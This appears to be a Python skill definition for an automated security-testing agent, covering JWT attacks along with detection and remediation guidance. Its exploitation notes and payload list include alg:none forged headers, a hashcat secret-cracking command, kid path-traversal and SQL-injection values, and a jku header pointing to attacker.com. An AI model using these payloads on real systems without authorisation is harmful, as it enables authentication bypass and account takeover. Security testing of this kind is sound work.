"""JWT (JSON Web Token) attacks - Signature bypass, algorithm confusion, header injection."""

SKILL = {
    "id": "jwt_attacks",
    "name": "JWT Token Attacks",
    "category": "auth",
    "severity": "critical",

    "detection": """
- Identify JWT tokens in cookies, Authorization headers, URL parameters
- JWT format: 3 base64url parts separated by dots (header.payload.signature)
- Decode header to check algorithm: HS256, RS256, none
- Check if tokens are passed in URLs (information leakage via logs/referer)
- Look for JWT in: Set-Cookie, Authorization: Bearer, query params, localStorage
- Check token expiration (exp claim) - are expired tokens accepted?
- Check if audience (aud) and issuer (iss) claims are validated
- Look for JWK/JWKS endpoints: /.well-known/jwks.json, /api/jwks
""",

    "exploitation": """
- Algorithm 'none' attack: Set alg to 'none' in header, remove signature
  Header: {"alg":"none","typ":"JWT"} + Payload + empty signature (just a dot)
- HS256 brute force: Crack weak secrets with hashcat: hashcat -a 0 -m 16500 <jwt> <wordlist>
  Common secrets: secret, password, 123456, changeme, key, jwt_secret
- Algorithm confusion: Change RS256 to HS256, sign with the PUBLIC key as HMAC secret
  This works when server uses same key variable for verify regardless of algorithm
- JWK header injection: Embed own RSA public key in the jwk header parameter
  Misconfigured servers use the embedded key for verification
- JKU header injection: Point jku to attacker-controlled JWKS URL
  Server fetches attacker's key set and uses it to verify
- KID parameter attacks:
  Path traversal: kid: "../../../dev/null" then sign with empty string
  SQL injection: kid: "' UNION SELECT 'secret-key' --"
- Modify claims: Change role, user_id, is_admin, email after bypassing signature
- Token replay: Reuse tokens after password change or logout
""",

    "remediation": """
- Use strong, random secrets for HMAC (minimum 256 bits / 32 bytes)
- ALWAYS verify signature server-side with proper library (not decode-only)
- Explicitly whitelist allowed algorithms: algorithms=['RS256'] (never accept 'none')
- Reject tokens with algorithm 'none' regardless of case
- Validate all claims: exp, iss, aud, iat, nbf
- Set short expiration times (15 minutes for access tokens)
- Implement token revocation (blacklist or reference tokens)
- Do NOT allow JWK/JKU from untrusted sources - whitelist JWKS URLs
- Sanitize KID parameter against path traversal and injection
- Use asymmetric algorithms (RS256, ES256) in production
- Never put sensitive data in JWT payload (it's only base64, not encrypted)
- SSH fix: Update JWT library, enforce algorithm whitelist in config
- Verify: Test with alg:none and modified claims, confirm rejection
""",

    "tools": ["http_request", "http_headers_check", "web_spider", "api_fuzzer"],

    "payloads": [
        'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.',  # alg: none header
        '{"alg":"none","typ":"JWT"}',
        '{"alg":"HS256","typ":"JWT"}',
        '{"alg":"HS256","typ":"JWT","jwk":{"kty":"oct","k":""}}',
        '{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}',
        '{"alg":"HS256","typ":"JWT","kid":"\' UNION SELECT \'key\' --"}',
        '{"alg":"HS256","typ":"JWT","jku":"https://attacker.com/jwks.json"}',
    ],

    "references": [
        "OWASP A07:2021 - Identification and Authentication Failures",
        "CWE-287: Improper Authentication",
        "CWE-347: Improper Verification of Cryptographic Signature",
    ],
}
